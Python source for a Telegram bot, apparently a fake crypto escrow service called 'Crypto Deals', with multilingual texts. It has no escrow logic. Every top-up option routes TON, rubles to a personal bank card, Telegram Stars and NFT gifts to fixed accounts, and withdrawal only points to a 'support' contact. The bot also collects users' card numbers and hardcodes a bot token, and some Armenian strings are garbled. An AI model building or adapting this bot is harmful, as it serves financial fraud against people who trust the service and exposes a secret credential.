import asyncio
import random
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, FSInputFile
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
from aiogram.exceptions import TelegramBadRequest

BOT_TOKEN = "8676951864:AAGNxc_bfdkBER0n8jh-8RrhlZKQj-ajyHs"
ADMIN_ID = 174415647

INVITE_LINK = "https://t.me/+uJb5tX3evGhiNzM6"
SUPPORT_USERNAME = "@CryptoDeal_Escrow"
MIDDLE_USERNAME = "@CryptoDeal_Middle"
TON_ADDRESS = "UQBu7JOWQIU72kp4r2TG45925P5Rg1qz5wzurEWmC5lWZbTL"
CARD_NUMBER = "2200702126310668"
PHONE_NUMBER = "89047262947"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ======================== TRANSLATIONS ========================
LANGS = {
    "ru": "🇷🇺 Русский",
    "en": "🇬🇧 English",
    "kz": "🇰🇿 Қазақша",
    "uz": "🇺🇿 O'zbekcha",
    "uk": "🇺🇦 Українська",
    "az": "🇦🇿 Azərbaycanca",
    "tr": "🇹🇷 Türkçe",
    "hy": "🇦🇲 Հայերեն",
}

TEXTS = {
    "welcome": {
        "ru": (
            "Добро пожаловать 👋\n\n"
            "💼 <b>Crypto Deals</b> - Мы специализированный сервис по обеспечению безопасности вне биржевых сделок.\n\n"
            "✨ Автоматизированный алгоритм исполнения.\n"
            "⚡️ Скорость и автоматизация.\n"
            "💳 Удобный и быстрый вывод средств.\n\n"
            "• Комиссия сервиса: <b>0%</b>\n"
            "• Режим работы: <b>24/7</b>\n"
            "• Техническая поддержка: <b>@CryptoDeal_Escrow</b>"
        ),
        "en": (
            "Welcome 👋\n\n"
            "💼 <b>Crypto Deals</b> - We are a specialized service for securing OTC transactions.\n\n"
            "✨ Automated execution algorithm.\n"
            "⚡️ Speed and automation.\n"
            "💳 Convenient and fast withdrawal.\n\n"
            "• Service fee: <b>0%</b>\n"
            "• Working hours: <b>24/7</b>\n"
            "• Technical support: <b>@CryptoDeal_Escrow</b>"
        ),
        "kz": (
            "Қош келдіңіз 👋\n\n"
            "💼 <b>Crypto Deals</b> - Биржадан тыс мәмілелердің қауіпсіздігін қамтамасыз етуге маманданған қызмет.\n\n"
            "✨ Автоматтандырылған орындау алгоритмі.\n"
            "⚡️ Жылдамдық және автоматтандыру.\n"
            "💳 Ыңғайлы және жылдам шығару.\n\n"
            "• Қызмет комиссиясы: <b>0%</b>\n"
            "• Жұмыс режимі: <b>24/7</b>\n"
            "• Техникалық қолдау: <b>@CryptoDeal_Escrow</b>"
        ),
        "uz": (
            "Xush kelibsiz 👋\n\n"
            "💼 <b>Crypto Deals</b> - Birjadan tashqari bitimlar xavfsizligini ta'minlashga ixtisoslashgan xizmat.\n\n"
            "✨ Avtomatlashtirilgan ijro algoritmi.\n"
            "⚡️ Tezlik va avtomatlashtirish.\n"
            "💳 Qulay va tez pul chiqarish.\n\n"
            "• Xizmat komissiyasi: <b>0%</b>\n"
            "• Ish rejimi: <b>24/7</b>\n"
            "• Texnik yordam: <b>@CryptoDeal_Escrow</b>"
        ),
        "uk": (
            "Ласкаво просимо 👋\n\n"
            "💼 <b>Crypto Deals</b> - Ми спеціалізований сервіс із забезпечення безпеки позабіржових угод.\n\n"
            "✨ Автоматизований алгоритм виконання.\n"
            "⚡️ Швидкість та автоматизація.\n"
            "💳 Зручне та швидке виведення коштів.\n\n"
            "• Комісія сервісу: <b>0%</b>\n"
            "• Режим роботи: <b>24/7</b>\n"
            "• Технічна підтримка: <b>@CryptoDeal_Escrow</b>"
        ),
        "az": (
            "Xoş gəlmisiniz 👋\n\n"
            "💼 <b>Crypto Deals</b> - Birjadankənar əməliyyatların təhlükəsizliyini təmin edən ixtisaslaşdırılmış xidmət.\n\n"
            "✨ Avtomatlaşdırılmış icra alqoritmi.\n"
            "⚡️ Sürət və avtomatlaşdırma.\n"
            "💳 Rahat və sürətli pul çıxarma.\n\n"
            "• Xidmət komissiyası: <b>0%</b>\n"
            "• İş rejimi: <b>24/7</b>\n"
            "• Texniki dəstək: <b>@CryptoDeal_Escrow</b>"
        ),
        "tr": (
            "Hoş geldiniz 👋\n\n"
            "💼 <b>Crypto Deals</b> - Borsa dışı işlemlerin güvenliğini sağlayan özel bir hizmet.\n\n"
            "✨ Otomatik yürütme algoritması.\n"
            "⚡️ Hız ve otomasyon.\n"
            "💳 Kolay ve hızlı para çekme.\n\n"
            "• Hizmet komisyonu: <b>0%</b>\n"
            "• Çalışma modu: <b>24/7</b>\n"
            "• Teknik destek: <b>@CryptoDeal_Escrow</b>"
        ),
        "hy": (
            "Բարի գալուստ 👋\n\n"
            "💼 <b>Crypto Deals</b> - Բորսայից դուրս գործարքների անվտանգությունն ապահովող մասնагիտական ծառայություն:\n\n"
            "✨ Ավտոմատացված կատարման ալգորիթm:\n"
            "⚡️ Արագություն և ավտոմատացում:\n"
            "💳 Հարմար և արագ դուրսբերում:\n\n"
            "• Ծառայության միջնորդավճար: <b>0%</b>\n"
            "• Աշխատանքային ռեժիm: <b>24/7</b>\n"
            "• Տեխնիկական աջակցություն: <b>@CryptoDeal_Escrow</b>"
        ),
    },
    "btn_deal": {
        "ru": "🔐 Создать Сделку", "en": "🔐 Create Deal", "kz": "🔐 Мәміле Жасау",
        "uz": "🔐 Bitim Yaratish", "uk": "🔐 Створити Угоду", "az": "🔐 Müqavilə Yarat",
        "tr": "🔐 Anlaşma Oluştur", "hy": "🔐 Ստեղծել Գործarq",
    },
    "btn_requisites": {
        "ru": "🧾 Реквизиты", "en": "🧾 Requisites", "kz": "🧾 Деректемелер",
        "uz": "🧾 Rekvizitlar", "uk": "🧾 Реквізити", "az": "🧾 Rekvizitlər",
        "tr": "🧾 Hesap Bilgileri", "hy": "🧾 Ռեկվիզիտներ",
    },
    "btn_topup": {
        "ru": "💰 Пополнить баланс", "en": "💰 Top Up Balance", "kz": "💰 Баланс толтыру",
        "uz": "💰 Balansni to'ldirish", "uk": "💰 Поповнити баланс", "az": "💰 Balansı artır",
        "tr": "💰 Bakiye Yükle", "hy": "💰 Համալրել հաշիվը",
    },
    "btn_withdraw": {
        "ru": "💸 Вывести средства", "en": "💸 Withdraw", "kz": "💸 Қаражат шығару",
        "uz": "💸 Mablag' chiqarish", "uk": "💸 Вивести кошти", "az": "💸 Vəsaiti çıxar",
        "tr": "💸 Para Çek", "hy": "💸 Դուրսբերել",
    },
    "btn_support": {
        "ru": "📋 Поддержка", "en": "📋 Support", "kz": "📋 Қолдау",
        "uz": "📋 Qo'llab-quvvatlash", "uk": "📋 Підтримка", "az": "📋 Dəstək",
        "tr": "📋 Destek", "hy": "📋 Աջakciություն",
    },
    "btn_menu": {
        "ru": "📱 Вернуться в меню", "en": "📱 Back to menu", "kz": "📱 Мәзірге оралу",
        "uz": "📱 Menyuga qaytish", "uk": "📱 Повернутися в меню", "az": "📱 Menyuya qayıt",
        "tr": "📱 Menüye Dön", "hy": "📱 Վերadagnda menyu",
    },
    "agreement": {
        "ru": (
            "☑️ <b>Пользовательское соглашение:</b>\n\n"
            "🛡️ Для обеспечения сохранности ваших активов строго соблюдайте установленный регламент проведения операций:\n\n"
            "<b>• Депонирование активов:</b>\n"
            "Передача активов осуществляется исключительно на верифицированные эскроу-счета сервиса через официальный контакт: @CryptoDeal_Escrow.\n\n"
            "<b>• Запрет прямых расчетов:</b>\n"
            "Категорически запрещено отправлять средства или товары напрямую покупателю/продавцу. Сервис не несет ответственности за сделки, совершенные вне платформы.\n\n"
            "<b>• Завершение сделки:</b>\n"
            "Вывод средств продавцу производится автоматически после того, как покупатель подтвердит факт получения и проверки товара/услуги.\n\n"
            "Подтверждая ознакомление с вышеуказанной информацией, нажмите кнопку ниже для перехода к следующему этапу."
        ),
        "en": (
            "☑️ <b>User Agreement:</b>\n\n"
            "🛡️ To ensure the safety of your assets, strictly follow the established transaction procedure:\n\n"
            "<b>• Asset Depositing:</b>\n"
            "Assets are transferred exclusively to verified escrow accounts via the official contact: @CryptoDeal_Escrow.\n\n"
            "<b>• No Direct Payments:</b>\n"
            "It is strictly forbidden to send funds or goods directly to the buyer/seller. The service is not responsible for transactions made outside the platform.\n\n"
            "<b>• Deal Completion:</b>\n"
            "Funds are released to the seller automatically after the buyer confirms receipt and verification of the goods/service.\n\n"
            "By confirming your acknowledgment, press the button below to proceed."
        ),
        "kz": (
            "☑️ <b>Пайдаланушы келісімі:</b>\n\n"
            "🛡️ Активтеріңіздің сақталуын қамтамасыз ету үшін белгіленген операция регламентін қатаң сақтаңыз.\n\n"
            "Растау үшін төмендегі түймені басыңыз."
        ),
        "uz": (
            "☑️ <b>Foydalanuvchi shartnomasi:</b>\n\n"
            "🛡️ Aktivlaringiz xavfsizligini ta'minlash uchun belgilangan tartibga qat'iy rioya qiling.\n\n"
            "Tasdiqlash uchun quyidagi tugmani bosing."
        ),
        "uk": (
            "☑️ <b>Угода користувача:</b>\n\n"
            "🛡️ Для забезпечення збереження ваших активів суворо дотримуйтесь встановленого регламенту проведення операцій.\n\n"
            "Натисніть кнопку нижче для підтвердження."
        ),
        "az": (
            "☑️ <b>İstifadəçi Razılaşması:</b>\n\n"
            "🛡️ Aktivlərinizin təhlükəsizliyini təmin etmək üçün müəyyən edilmiş qaydaları ciddi şəkildə riayət edin.\n\n"
            "Təsdiq etmək üçün aşağıdakı düyməni basın."
        ),
        "tr": (
            "☑️ <b>Kullanıcı Sözleşmesi:</b>\n\n"
            "🛡️ Varlıklarınızın güvenliğini sağlamak için belirlenen işlem prosedürlerine kesinlikle uyun.\n\n"
            "Onaylamak için aşağıdaki düğmeye basın."
        ),
        "hy": (
            "☑️ <b>Օգտатիրոջ Համաձայնություն:</b>\n\n"
            "🛡️ Ձեր ակտivների անвτangությունն ապahovanելu humar խísтabam riayет eghek:\n\n"
            "Հաստatgelu uhn seclect aghekir knopka."
        ),
    },
    "btn_confirm": {
        "ru": "📍 Подтвердить Ознакомление", "en": "📍 Confirm Acknowledgment",
        "kz": "📍 Растау", "uz": "📍 Tasdiqlash", "uk": "📍 Підтвердити",
        "az": "📍 Təsdiqlə", "tr": "📍 Onayla", "hy": "📍 Հաստatgel",
    },
    "no_requisites": {
        "ru": "📎 Вы не добавили реквизиты",
        "en": "📎 You haven't added requisites",
        "kz": "📎 Сіз деректемелерді қоспадыңыз",
        "uz": "📎 Siz rekvizitlar qo'shmagansiz",
        "uk": "📎 Ви не додали реквізити",
        "az": "📎 Rekvizitlər əlavə etməmisiniz",
        "tr": "📎 Hesap bilgisi eklemediniz",
        "hy": "📎 Դուq ռekvizitner chnets",
    },
    "btn_add_req": {
        "ru": "➕ Добавить реквизиты", "en": "➕ Add Requisites", "kz": "➕ Деректеме қосу",
        "uz": "➕ Rekvizit qo'shish", "uk": "➕ Додати реквізити", "az": "➕ Rekvizit əlavə et",
        "tr": "➕ Hesap Bilgisi Ekle", "hy": "➕ Avo reqvizitner",
    },
    "requisites_menu": {
        "ru": (
            "🧾 <b>Реквизиты</b>\n\n"
            "Добавьте ваши реквизиты для получения выплат.\n"
            "Выберите тип:"
        ),
        "en": (
            "🧾 <b>Requisites</b>\n\n"
            "Add your requisites to receive payments.\n"
            "Choose type:"
        ),
        "kz": "🧾 <b>Деректемелер</b>\n\nТүрін таңдаңыз:",
        "uz": "🧾 <b>Rekvizitlar</b>\n\nTurini tanlang:",
        "uk": "🧾 <b>Реквізити</b>\n\nОберіть тип:",
        "az": "🧾 <b>Rekvizitlər</b>\n\nNövü seçin:",
        "tr": "🧾 <b>Hesap Bilgileri</b>\n\nTür seçin:",
        "hy": "🧾 <b>Ռekvizitner</b>\n\nAmchin entrek:",
    },
    "topup_menu": {
        "ru": "💰 <b>Пополнение баланса</b>\n\nВыберите способ пополнения:",
        "en": "💰 <b>Top Up Balance</b>\n\nSelect method:",
        "kz": "💰 <b>Баланс толтыру</b>\n\nӘдісті таңдаңыз:",
        "uz": "💰 <b>Balansni to'ldirish</b>\n\nUsulni tanlang:",
        "uk": "💰 <b>Поповнення балансу</b>\n\nОберіть спосіб:",
        "az": "💰 <b>Balans artırma</b>\n\nMetodu seçin:",
        "tr": "💰 <b>Bakiye Yükleme</b>\n\nYöntem seçin:",
        "hy": "💰 <b>Hamalsrel hashiv</b>\n\nAmoghj entrek:",
    },
    "withdraw_text": {
        "ru": (
            "💸 <b>Вывод средств</b>\n\n"
            "Для вывода средств обратитесь в техническую поддержку:\n"
            f"👤 {MIDDLE_USERNAME}\n\n"
            "⚠️ Укажите сумму и реквизиты для вывода."
        ),
        "en": (
            "💸 <b>Withdraw Funds</b>\n\n"
            "To withdraw funds, contact support:\n"
            f"👤 {MIDDLE_USERNAME}\n\n"
            "⚠️ Specify amount and withdrawal details."
        ),
        "kz": f"💸 <b>Қаражат шығару</b>\n\nҚолдауға хабарласыңыз: {MIDDLE_USERNAME}",
        "uz": f"💸 <b>Mablag' chiqarish</b>\n\nQo'llab-quvvatlashga murojaat qiling: {MIDDLE_USERNAME}",
        "uk": f"💸 <b>Виведення коштів</b>\n\nЗверніться до підтримки: {MIDDLE_USERNAME}",
        "az": f"💸 <b>Vəsait çıxarılması</b>\n\nDəstəyə müraciət edin: {MIDDLE_USERNAME}",
        "tr": f"💸 <b>Para Çekme</b>\n\nDestekle iletişime geçin: {MIDDLE_USERNAME}",
        "hy": f"💸 <b>Durs berel</b>\n\nAjakhtsut'yun: {MIDDLE_USERNAME}",
    },
    "choose_lang": {
        "ru": "🌐 Выберите язык:",
        "en": "🌐 Choose language:",
        "kz": "🌐 Тілді таңдаңыз:",
        "uz": "🌐 Tilni tanlang:",
        "uk": "🌐 Оберіть мову:",
        "az": "🌐 Dil seçin:",
        "tr": "🌐 Dil seçin:",
        "hy": "🌐 Lezun entrek:",
    },
}

# ======================== USER DATA ========================
user_data = {}  # user_id -> {lang, ton_wallet, card, username_stars, has_requisites}

def get_user(uid):
    if uid not in user_data:
        user_data[uid] = {"lang": "ru", "ton_wallet": "", "card": "", "username_stars": "", "has_requisites": False}
    return user_data[uid]

def t(uid, key):
    lang = get_user(uid).get("lang", "ru")
    d = TEXTS.get(key, {})
    return d.get(lang, d.get("ru", ""))

# ======================== STATES ========================
class SetBanner(StatesGroup):
    waiting = State()

class AddRequisites(StatesGroup):
    ton = State()
    card = State()
    stars_username = State()

# ======================== KEYBOARDS ========================
def lang_kb():
    btns = []
    items = list(LANGS.items())
    for i in range(0, len(items), 2):
        row = [InlineKeyboardButton(text=items[i][1], callback_data=f"lang_{items[i][0]}")]
        if i+1 < len(items):
            row.append(InlineKeyboardButton(text=items[i+1][1], callback_data=f"lang_{items[i+1][0]}"))
        btns.append(row)
    return InlineKeyboardMarkup(inline_keyboard=btns)

def main_kb(uid):
    lang = get_user(uid).get("lang", "ru")
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=t(uid, "btn_deal"), callback_data="deal"),
            InlineKeyboardButton(text=t(uid, "btn_requisites"), callback_data="requisites"),
        ],
        [
            InlineKeyboardButton(text=t(uid, "btn_topup"), callback_data="topup"),
            InlineKeyboardButton(text=t(uid, "btn_withdraw"), callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton(text=t(uid, "btn_support"), url="https://t.me/CryptoDeal_Middle"),
            InlineKeyboardButton(text="🌐 Язык / Language", callback_data="change_lang"),
        ],
    ])

def agreement_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t(uid, "btn_confirm"), callback_data="confirm_agreement")],
        [InlineKeyboardButton(text=t(uid, "btn_menu"), callback_data="menu")],
        [InlineKeyboardButton(text=t(uid, "btn_support"), url="https://t.me/CryptoDeal_Middle")],
    ])

def no_req_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t(uid, "btn_add_req"), callback_data="requisites")],
        [InlineKeyboardButton(text="📗 В меню", callback_data="menu")],
    ])

def req_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="💎 TON кошелёк", callback_data="req_ton"),
            InlineKeyboardButton(text="💳 Карта", callback_data="req_card"),
        ],
        [
            InlineKeyboardButton(text="⭐️ Username для Stars", callback_data="req_stars"),
        ],
        [InlineKeyboardButton(text=t(uid, "btn_menu"), callback_data="menu")],
    ])

def topup_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="⭐️ Stars", callback_data="topup_stars"),
            InlineKeyboardButton(text="💎 TON", callback_data="topup_ton"),
        ],
        [
            InlineKeyboardButton(text="💳 Карта", callback_data="topup_card"),
            InlineKeyboardButton(text="🎁 NFT", callback_data="topup_nft"),
        ],
        [InlineKeyboardButton(text=t(uid, "btn_menu"), callback_data="menu")],
        [InlineKeyboardButton(text=t(uid, "btn_support"), url="https://t.me/CryptoDeal_Middle")],
    ])

def back_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t(uid, "btn_menu"), callback_data="menu")],
        [InlineKeyboardButton(text=t(uid, "btn_support"), url="https://t.me/CryptoDeal_Middle")],
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🖼 Изменить баннер", callback_data="adm_banner"),
            InlineKeyboardButton(text="📊 Статистика", callback_data="adm_stats"),
        ],
        [
            InlineKeyboardButton(text="👥 Пользователи", callback_data="adm_users"),
        ],
    ])

# ======================== ADMIN PANEL ========================
@dp.message(Command("adm"))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    total_users = len(user_data)
    await message.answer(
        f"🔧 <b>Админ-панель</b>\n\n"
        f"👥 Пользователей: <b>{total_users}</b>\n\n"
        f"Выберите действие:",
        parse_mode="HTML",
        reply_markup=admin_kb()
    )

@dp.callback_query(F.data == "adm_banner")
async def adm_banner(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        return
    await callback.message.answer(
        "📸 Отправьте <b>фото + подпись</b> (caption) для нового баннера.\n\n"
        "Фото и текст будут отображаться вместе при /start",
        parse_mode="HTML"
    )
    await state.set_state(SetBanner.waiting)
    await callback.answer()

@dp.message(SetBanner.waiting, F.photo)
async def save_banner(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    photo_id = message.photo[-1].file_id
    caption = message.caption or ""
    user_data["_banner"] = {"photo_id": photo_id, "caption": caption}
    await message.answer("✅ Баннер обновлён!")
    await state.clear()

@dp.callback_query(F.data == "adm_stats")
async def adm_stats(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    total = len([k for k in user_data.keys() if not str(k).startswith("_")])
    with_req = len([v for k, v in user_data.items() if not str(k).startswith("_") and v.get("has_requisites")])
    await callback.message.answer(
        f"📊 <b>Статистика</b>\n\n"
        f"👥 Всего пользователей: <b>{total}</b>\n"
        f"🧾 С реквизитами: <b>{with_req}</b>\n"
        f"💼 Сделок: <b>0</b>\n"
        f"💰 Оборот: <b>0 TON</b>\n"
        f"⭐️ Репутация: <b>—</b>",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "adm_users")
async def adm_users(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
    users_list = [k for k in user_data.keys() if not str(k).startswith("_")]
    text = f"👥 <b>Пользователи ({len(users_list)})</b>\n\n"
    for uid in users_list[:20]:
        u = user_data[uid]
        text += f"• ID: <code>{uid}</code> | Язык: {u.get('lang','ru')} | Реквизиты: {'✅' if u.get('has_requisites') else '❌'}\n"
    if len(users_list) > 20:
        text += f"\n... и ещё {len(users_list)-20}"
    await callback.message.answer(text, parse_mode="HTML")
    await callback.answer()

# ======================== /START ========================
@dp.message(Command("start"))
async def start(message: Message):
    uid = message.from_user.id
    get_user(uid)
    banner = user_data.get("_banner")
    if banner:
        await message.answer_photo(
            photo=banner["photo_id"],
            caption=banner["caption"] or t(uid, "welcome"),
            parse_mode="HTML",
            reply_markup=main_kb(uid)
        )
    else:
        await message.answer(
            t(uid, "welcome"),
            parse_mode="HTML",
            reply_markup=main_kb(uid)
        )

# ======================== LANGUAGE ========================
@dp.callback_query(F.data == "change_lang")
async def change_lang(callback: CallbackQuery):
    uid = callback.from_user.id
    await callback.message.answer("🌐 Выберите язык / Choose language:", reply_markup=lang_kb())
    await callback.answer()

@dp.callback_query(F.data.startswith("lang_"))
async def set_lang(callback: CallbackQuery):
    uid = callback.from_user.id
    lang = callback.data.split("_")[1]
    get_user(uid)["lang"] = lang
    await callback.message.answer(t(uid, "welcome"), parse_mode="HTML", reply_markup=main_kb(uid))
    await callback.answer()

# ======================== MENU ========================
@dp.callback_query(F.data == "menu")
async def menu(callback: CallbackQuery):
    uid = callback.from_user.id
    banner = user_data.get("_banner")
    if banner:
        await callback.message.answer_photo(
            photo=banner["photo_id"],
            caption=banner["caption"] or t(uid, "welcome"),
            parse_mode="HTML",
            reply_markup=main_kb(uid)
        )
    else:
        await callback.message.answer(t(uid, "welcome"), parse_mode="HTML", reply_markup=main_kb(uid))
    await callback.answer()

# ======================== DEAL ========================
@dp.callback_query(F.data == "deal")
async def deal(callback: CallbackQuery):
    uid = callback.from_user.id
    await callback.message.answer(t(uid, "agreement"), parse_mode="HTML", reply_markup=agreement_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "confirm_agreement")
async def confirm_agreement(callback: CallbackQuery):
    uid = callback.from_user.id
    user = get_user(uid)
    if not user.get("has_requisites"):
        await callback.message.answer(t(uid, "no_requisites"), parse_mode="HTML", reply_markup=no_req_kb(uid))
    else:
        await callback.message.answer(
            "✅ Ваша заявка принята!\n\nМенеджер свяжется с вами в ближайшее время.\n"
            f"Поддержка: {SUPPORT_USERNAME}",
            parse_mode="HTML",
            reply_markup=back_kb(uid)
        )
    await callback.answer()

# ======================== REQUISITES ========================
@dp.callback_query(F.data == "requisites")
async def requisites(callback: CallbackQuery):
    uid = callback.from_user.id
    user = get_user(uid)
    ton = user.get("ton_wallet", "") or "—"
    card = user.get("card", "") or "—"
    stars = user.get("username_stars", "") or "—"
    text = (
        t(uid, "requisites_menu") + "\n\n"
        f"💎 TON: <code>{ton}</code>\n"
        f"💳 Карта: <code>{card}</code>\n"
        f"⭐️ Username для Stars: <code>{stars}</code>"
    )
    await callback.message.answer(text, parse_mode="HTML", reply_markup=req_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "req_ton")
async def req_ton(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await callback.message.answer("💎 Введите ваш TON кошелёк:")
    await state.set_state(AddRequisites.ton)
    await callback.answer()

@dp.message(AddRequisites.ton)
async def save_ton(message: Message, state: FSMContext):
    uid = message.from_user.id
    get_user(uid)["ton_wallet"] = message.text
    get_user(uid)["has_requisites"] = True
    await message.answer("✅ TON кошелёк сохранён!", reply_markup=main_kb(uid))
    await state.clear()

@dp.callback_query(F.data == "req_card")
async def req_card(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await callback.message.answer("💳 Введите номер карты:")
    await state.set_state(AddRequisites.card)
    await callback.answer()

@dp.message(AddRequisites.card)
async def save_card(message: Message, state: FSMContext):
    uid = message.from_user.id
    get_user(uid)["card"] = message.text
    get_user(uid)["has_requisites"] = True
    await message.answer("✅ Карта сохранена!", reply_markup=main_kb(uid))
    await state.clear()

@dp.callback_query(F.data == "req_stars")
async def req_stars(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await callback.message.answer("⭐️ Введите ваш Telegram username для получения Stars (например @username):")
    await state.set_state(AddRequisites.stars_username)
    await callback.answer()

@dp.message(AddRequisites.stars_username)
async def save_stars(message: Message, state: FSMContext):
    uid = message.from_user.id
    get_user(uid)["username_stars"] = message.text
    get_user(uid)["has_requisites"] = True
    await message.answer("✅ Username для Stars сохранён!", reply_markup=main_kb(uid))
    await state.clear()

# ======================== TOP UP ========================
@dp.callback_query(F.data == "topup")
async def topup(callback: CallbackQuery):
    uid = callback.from_user.id
    await callback.message.answer(t(uid, "topup_menu"), parse_mode="HTML", reply_markup=topup_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "topup_stars")
async def topup_stars(callback: CallbackQuery):
    uid = callback.from_user.id
    text = (
        "⭐️ <b>Пополнение баланса посредством Telegram Stars:</b>\n\n"
        "Для зачисления активов необходимо осуществить передачу единиц Stars по указанному юзернейму технической поддержки: "
        f"<b>{MIDDLE_USERNAME}</b>\n\n"
        "<b>Регламент проведения операции:</b>\n\n"
        f"• Перейдите в диалоговое окно с верифицированным аккаунтом: <b>{MIDDLE_USERNAME}</b>\n\n"
        "• Используйте функционал Telegram для приобретения и направления необходимого объема Stars на указанный юзернейм.\n\n"
        "• После подтверждения транзакции системой, ваш баланс будет пополнен в автоматическом режиме.\n\n"
        "⚠️ <b>Внимание:</b> Во избежание финансовых потерь, совершайте перевод исключительно по указанным реквизитам службы поддержки.\n\n"
        "⏱ Зачисление: <b>5–15 минут</b>"
    )
    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "topup_ton")
async def topup_ton(callback: CallbackQuery):
    uid = callback.from_user.id
    text = (
        "💎 <b>Адрес для зачисления активов TON:</b>\n\n"
        f"<code>{TON_ADDRESS}</code>\n\n"
        "По факту отправки средств инициируйте запрос в службу поддержки для окончательного подтверждения операции.\n\n"
        f"👤 {MIDDLE_USERNAME}\n\n"
        "⏱ Зачисление: <b>5–15 минут</b>"
    )
    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "topup_card")
async def topup_card(callback: CallbackQuery):
    uid = callback.from_user.id
    text = (
        "💳 <b>Пополнение баланса: Банковские карты (РФ)</b>\n\n"
        "Для внесения средств на лицевой счет с помощью банковской карты, следуйте алгоритму:\n\n"
        "<b>• Формирование заявки:</b>\n"
        "Укажите сумму пополнения в рублях (RUB).\n\n"
        "<b>• Перевод средств:</b>\n"
        "Используйте предоставленные системой реквизиты для совершения перевода.\n\n"
        "<b>• Верификация:</b>\n"
        "Сохраните электронный чек транзакции до подтверждения зачисления.\n\n"
        "Реквизиты для зачисления средств на баланс:\n"
        f"<code>{CARD_NUMBER}</code>\n"
        f"Альфа Банк | {PHONE_NUMBER}\n\n"
        "⏱ Зачисление: <b>5–15 минут</b>"
    )
    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_kb(uid))
    await callback.answer()

@dp.callback_query(F.data == "topup_nft")
async def topup_nft(callback: CallbackQuery):
    uid = callback.from_user.id
    text = (
        "🎁 <b>Пополнение баланса посредством передачи цифровых активов (NFT)</b>\n\n"
        "Теперь вы можете пополнить баланс, отправив нам свои NFT-подарки! "
        "Мы принимаем любые лимитированные подарки из официальной коллекции Telegram.\n\n"
        "<b>Регламент проведения операции:</b>\n\n"
        "<b>• Выбор актива:</b>\n"
        "Выберите соответствующий NFT-подарок в вашем профиле Telegram.\n\n"
        "<b>• Передача:</b>\n"
        f"Направьте запрос и передайте актив официальной службе поддержки: <b>{MIDDLE_USERNAME}</b>\n\n"
        "<b>• Оценка и зачисление:</b>\n"
        "После верификации актива специалистом будет произведена рыночная оценка в эквиваленте Telegram Stars или TON. "
        "Денежные средства будут зачислены на ваш баланс моментально по завершении процедуры оценки.\n\n"
        "⏱ Зачисление: <b>5–15 минут</b>"
    )
    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_kb(uid))
    await callback.answer()

# ======================== WITHDRAW ========================
@dp.callback_query(F.data == "withdraw")
async def withdraw(callback: CallbackQuery):
    uid = callback.from_user.id
    await callback.message.answer(t(uid, "withdraw_text"), parse_mode="HTML", reply_markup=back_kb(uid))
    await callback.answer()

# ======================== MAIN ========================
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
